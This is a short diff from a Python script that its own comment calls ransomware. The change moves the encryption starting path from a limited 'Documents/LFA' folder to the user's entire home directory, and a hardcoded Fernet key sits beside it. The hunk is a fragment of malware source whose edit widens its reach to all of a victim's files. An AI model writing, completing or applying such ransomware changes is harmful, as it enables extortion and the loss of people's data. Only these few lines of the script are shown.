@@ -24,7 +24,7 @@ def showMenu():
 
 #Configure starting path of the ransomware
 path = Path(Path.home()).absolute()
-foldername = path / 'Documents' / 'LFA'
+foldername = path
 files = getFiles(foldername)
 #Cryptography key
 fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')
